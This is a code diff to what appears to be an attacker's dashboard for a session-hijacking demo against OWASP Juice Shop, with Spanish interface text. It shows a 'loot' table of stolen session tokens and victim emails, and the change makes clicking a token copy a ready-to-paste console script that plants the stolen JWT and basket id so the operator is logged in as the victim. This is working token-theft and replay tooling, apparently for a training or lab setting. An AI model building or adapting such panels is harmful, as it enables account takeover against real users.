@@ -119,7 +119,7 @@ function renderStats(payload) {
     const time = new Date(loot.ts).toLocaleTimeString();
     const origin = (String(loot.ua || '').match(/Android|iPhone|iPad|Windows|Macintosh|Linux/) || ['?'])[0];
     const victim = loot.stolen ? (loot.email || 'sesión robada') : 'sin sesión (none)';
-    const tokenCell = loot.stolen ? '<code class="tok" data-tok="' + escapeHtml(loot.token) + '" title="click para copiar">' + escapeHtml(loot.token.slice(0, 48)) + '…</code>' : '—';
+    const tokenCell = loot.stolen ? '<code class="tok" data-tok="' + escapeHtml(loot.token) + '" data-bid="' + (loot.bid == null ? '' : escapeHtml(String(loot.bid))) + '" title="click para copiar el script de replay">' + escapeHtml(loot.token.slice(0, 48)) + '…</code>' : '—';
     return '<tr class="' + (loot.stolen ? 'hot' : '') + '"><td>' + time + '</td><td>' + escapeHtml(origin) + '</td><td>' + escapeHtml(victim) + '</td><td>' + tokenCell + '</td></tr>';
   }).join('') : '<tr><td colspan="4" class="empty">Aún no hay ejecuciones del payload.</td></tr>';
 }
@@ -196,11 +196,20 @@ $('btnCopy2').onclick = () => {
     setTimeout(() => { $('btnCopy2').textContent = 'Copiar URL'; }, 1500);
   });
 };
-// Clicking a token in the loot table copies the full JWT (for the replay finale).
+// Clicking a token in the loot table copies a READY-TO-PASTE replay script.
+// Juice Shop's login stores the JWT in localStorage AND the basket id in
+// sessionStorage; without "bid" the app requests /rest/basket/NaN and crashes
+// reading .Products of null. Paste the script into the browser console of any
+// Juice Shop tab (F12) and it logs you into the victim's account.
 $('lootRows').addEventListener('click', event => {
   const target = event.target.closest('.tok');
   if (!target) return;
-  copyText(target.dataset.tok, () => { target.textContent = 'copiado'; });
+  const token = target.dataset.tok;
+  const bid = target.dataset.bid || '';
+  const script = 'localStorage.setItem("token", ' + JSON.stringify(token) + ');' +
+    'sessionStorage.setItem("bid", ' + JSON.stringify(bid) + ');' +
+    'location.href = "/#/";';
+  copyText(script, () => { target.textContent = 'script copiado'; });
 });
 start();
 </script>
